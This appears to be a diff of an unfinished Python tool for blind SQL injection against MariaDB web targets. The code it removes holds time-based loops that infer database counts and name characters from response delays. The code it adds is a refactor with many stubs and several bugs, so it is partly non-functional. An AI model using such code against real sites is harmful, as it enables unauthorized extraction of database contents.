@@ -12,18 +12,13 @@ class HTTPrequest():
     """ Sends HTTP request and retrieves response. """
 
     def __init__(self, url, header, data=None):
-        self.url = url
+        self.url = HTTPUrlEncode(url, data).encode()
         self.header = self._format_header(header)
         self.data = data
-        self.request = None
-        self.response = None
-        self.payload = None
-        self.payload_parts = None
+        self.request = self._create_request()
 
-    def send_request(self, payload):
+    def send_request(self):
         """ Send HTTP request and decompress response if gzip compressed. """
-        self.payload = self._encode_url(payload)
-        self._create_request()
         with urllib.request.urlopen(self.request) as response:
             self.response = response.read()
             # Check if gzip compressed.
@@ -32,13 +27,9 @@ class HTTPrequest():
 
             return self.response
 
-    def get_response(self):
-        """ Return HTTP response. """
-        return self.response
-
     def _create_request(self):
         """ Create a request object  """
-        self.request = urllib.request.Request(self.payload, self.data, self.header)
+        return urllib.request.Request(self.url, self.data, self.header)
 
     def _format_header(self, header):
         """ Format list of headers input from cli and return a dict.  """
@@ -51,137 +42,162 @@ class HTTPrequest():
 
         return self.header_dict
 
-    def _encode_url(self, payload):
-        """ Encode url """
-        self.payload_parts = self._parse_url(payload)
-        self.payload_parts = self._url_encode_path()
-        self.payload_parts = self._url_encode_params()
-        self.payload_parts = self._url_encode_query()
-        return self.payload_parts.geturl()
 
-    def _parse_url(self, payload):
-        """ Returns a named tuple of url split into parts.  """
-        return urllib.parse.urlparse(payload)
+
+class HTTPUrlEncode():
+    """ Encode url and data. """
+    def __init__(self, url, data=None):
+        # Named tuple of url split into parts.
+        self.url = urllib.parse.urlparse(url)
+        self.data = data
+
+    def encode(self):
+        """ Return an encoded url. """
+        self._url_encode_path()
+        self._url_encode_params()
+        self.url_encode_query()
+        return self.url.geturl()
 
     def _url_encode_path(self):
         """ Encode the path of a url.  """
-        self.path = self.payload_parts.path
-        return self.payload_parts._replace(path=urllib.parse.quote(self.path))
+        self.path = self.url.path
+        return self.url._replace(path=urllib.parse.quote(self.path))
 
     def _url_encode_params(self):
         """ Encode the parameters of a url.  """
-        self.params = self.payload_parts.params
-        return self.payload_parts._replace(params=urllib.parse.quote(self.params))
+        self.params = self.url.params
+        return self.url._replace(params=urllib.parse.quote(self.params))
 
     def _url_encode_query(self):
         """ Encode the query/queries of a url.  """
-        self.query = self.payload_parts.query
-        return self.payload_parts._replace(query=urllib.parse.quote(self.query, safe='&='))
+        self.query = self.url.query
+        return self.url._replace(query=urllib.parse.quote(self.query, safe='&='))
 
-###### Injection base class ######
-
-class BaseInjection(HTTPrequest):
-
-    def __init__(self, url, header, data=None):
+class HTTPTimedRequest(HTTPrequest):
+    """ Timed request for time-based injection attack. """
+    def __init__(self, url, header, data):
         super().__init__(url, header, data)
-        self.CHAR_SET = config.Characters.ALL_CHARS.value
-        self.payload = None
-        self.database_name_chars = []
+        self.time_taken = 0
 
-    def get_version(self):
-        pass
+    def send_request(self):
+        """ return the time taken for the request """
+        self.start = time.time()
+        self.response = super().send_request()
+        self.finish = time.time()
+        self.time_taken = self.finish - self.start
+        return self.time_taken
 
-    def get_column_num(self):
-        pass
-
-    def get_database_num(self, query):
-        for i in range(0, 50):
-            self.payload = self.url + query
-            self.time_start = time.time()
-            self.res = self.send_request(self.payload.format(i))
-            self.time_finish = time.time()
-            self.total_time = self.time_finish - self.time_start
-            if(self.total_time > 1):
-                print('Number of databases found = ',i , ', with a response time of ', self.total_time)
-
-    def get_databases(self, query):
-        self._find_chars_used(query)
-
-    def get_table_names(self):
-        pass
-
-    def get_table_columns(self):
-        pass
-
-    def _find_chars_used(self, query):
-        """ Iterate over legal characters to find a subset that is used. """
-        for char in self.CHAR_SET:
-            self.payload = self.url + query
-            self.time_start = time.time()
-            self.res = self.send_request(self.payload.format(hex(ord(char))))
-            self.time_finish = time.time()
-            self.total_time = self.time_finish - self.time_start
-            if(self.total_time > 5):
-                print('Character found: ', char, ' ... in response time of', self.total_time)
-                self.database_name_chars.append(char)
-
-    def _find_database_names(self, query):
-        """ Iterate over known characters to find database names. """
-        self.char_found = True
-        index = 0
-        self.multiple_convert = ''
-        self.test_convert = ''
-        char_found_index = 0
-        while(self.char_found):
-            for char in self.database_name_chars:
-                self.payload = self.url + query
-                self.single_convert = 'CONVERT({} USING utf8), '.format(hex(ord(char)))
-                self.test_convert = self.test_convert + self.single_convert
-                self.time_start = time.time()
-                self.res = self.send_request(self.payload.format(self.test_convert))
-                self.time_finish = time.time()
-                self.total_time = self.time_finish - self.time_start
-                if(self.total_time > 5):
-                    self.multiple_convert = self.multiple_convert + self.test_convert
-                    print(char)
-                else:
-                    self.test_convert = self.multiple_convert
-                    char_found_index = char_found_index + 1
-            if(char_found_index == len(self.name_chars)):
-                self.char_found = False
-###### MySQL ######
-
-class MySQLunion(BaseInjection):
-
-    def __init__(self):
-        pass
 
 ###### mariaDB ######
 
-class MariaDB(BaseInjection):
-
+class MariaDBdatabase():
+    """ Class that finds the number of databases and names of each database.  """
     def __init__(self, url, header, data=None):
-        super().__init__(url, header, data)
+        self.database_num = 0
+        self.database = Tuple()
+        self.url = url
+        self.header = header
+        self.data = data
+        # max num of databases to search.
+        MAX_RANGE = 50
 
-    def get_database_num(self):
-        super().get_database_num(config.MariaDB.DATABASE_NUM.value)
+    def search_database(self):
+        self._search_num_database()
+        self._search_database_name()
 
-    def get_databases(self):
-        super().get_databases(config.MariaDB.DATABASE_NAME_CHAR.value)
+    def get_database(self):
+        """ Returns tuple of database name, with first index being number of databases. """
+        return self.database
+
+    def _search_num_database(self):
+        """ Finds number of databases """
+        # database query
+        self.query = config.MariaDB.DATABASE_NUM.value
+        for i in range(0, MAX_RANGE + 1):
+            if(TIME):
+                pass
+            elif(ERROR):
+                pass
+            elif(BOOLEAN):
+                pass
+            else:
+                pass
+
+    def _search_database_name(self):
+        pass
+
+
+    def _time_request(self):
+        pass
+
+
+class MariaDBtable():
+    pass
+
+class MariaDBcolumns():
+    pass
+
+class MariaDBrows():
+    pass
+
+class MariaDB():
+    """ Main database object for controlling enumeration of mariaDB databases. """
+    def __init__(self,url,header,data=None,time=False,error=False,boolean=False,verbose=False):
+        self.url = url
+        self.header = header
+        self.data = data
+        self.attack = self._attack(time, error, boolean)
+
+    def _attack(self, time, error, boolean):
+        """ Define type of attack """
+        if(time):
+            return "TIME"
+        elif(error):
+            return "ERROR"
+        elif(boolean):
+            return "BOOLEAN"
+        else:
+            print("Unsupported attack type")
+
+    def attack_database(self):
+        print('Database attacked!')
+
+###### Main object builder ######
+class Factory():
+    """ Factory that gets classname of the main injection object. """
+    def __init__(self, option):
+        self.option = option
+
+    def get_class_name(self):
+        class_ = {"-mDB" : MariaDB}.get(self.option)
+        return class_
+
 
 ###### Command line parser ######
 parser = argparse.ArgumentParser()
 
 parser.add_argument("url", help="url of target in format http://x.x.x.x:port/path")
 parser.add_argument("-H", "--header", help="Header values in comma seperated list. See README for formatting. ex. Host: x.x.x.x, Accept: text/html")
-
+parser.add_argument("-d", "--data", help="Data for HTTP POST.")
+parser.add_argument("-T", "--time", help="Time based attack.", action="store_true")
+parser.add_argument("-E", "--error", help="Error based attack.", action="store_true")
+parser.add_argument("-B", "--boolean", help="Boolean based attack.", action="store_true")
+parser.add_argument("-mDB", "--maria", help="mariaDB query.", action="store_true")
+parser.add_argument("-SQL", "--mySQL", help="mySQL query.", action="store_true")
+parser.add_argument("-msSQL", "--microsoft", help="microsoft SQL query.", action="store_true")
+parser.add_argument("-or", "--oracle", help="oracle SQL query.", action="store_true")
+parser.add_argument("-pGRE", "--postGRE", help="postGRE SQL query.", action="store_true")
+parser.add_argument("-v", "--verbose", help="verbose output.", action="store_true")
 
 ###### Main function ######
 def main():
     args = parser.parse_args()
-    test_obj = MariaDB(url=args.url, header=args.header)
-    test_obj.get_database_num()
-    test_obj.get_databases()
+    database_object = None
+    if(args.maria):
+        class_name = Factory("-mDB").get_class_name()
+
+    database_object = class_name(args.url, args.header, args.data, args.time, args.error, args.boolean, args.verbose)
+    database_object.attack_database()
 
 if __name__ == "__main__":
     main()
